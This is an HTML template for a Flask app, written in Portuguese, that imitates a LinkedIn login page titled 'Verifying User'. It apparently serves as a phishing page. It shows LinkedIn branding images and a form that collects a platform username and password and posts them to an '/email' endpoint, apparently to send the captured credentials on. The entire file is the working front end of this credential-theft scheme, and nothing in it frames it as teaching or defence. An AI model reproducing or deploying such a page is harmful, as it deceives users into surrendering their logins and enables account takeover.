<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="utf-8">
        <title>Verificando Usuario</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
        <link rel= "stylesheet" type= "text/css" href= "{{ url_for('static',filename='styles/style.css') }}">
    </head>
    <body>
        <main>
            <section>
                <img src="{{url_for('static', filename='images/Header_LinkedIn.png')}}" class="d-block w-100 imagem">
                <img src="{{url_for('static', filename='images/LinkedIn_Logo.png')}}" class="d-block w-40 logo ms-5">
            </section>
        <div>
            <form action="/email" enctype="multipart/form-data" method="post" class="col-12 col-md-4 form">
                <div class="mb-4">
                    <label class="form-label">Usuario</label>
                    <input type="text" name="nome" id="nome" placeholder="usuario plataforma" class="form-control">
                </div>
                <div class="mb-4">
                    <label class="form-label">Senha</label>
                    <input type="password"  name="senha" id="senha" placeholder="senha plataforma" class="form-control">
                </div>
                <button type="submit" class="btn btn-primary botao">Login</button>
            </form>
        </div>
        </main>
        <footer class="mt-5">
            <div>
                <img src="{{url_for('static', filename='images/Footer_LinkedIn.png')}}" class="d-block w-100 imagem">
            </div>
        </footer>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
    </body>
</html>
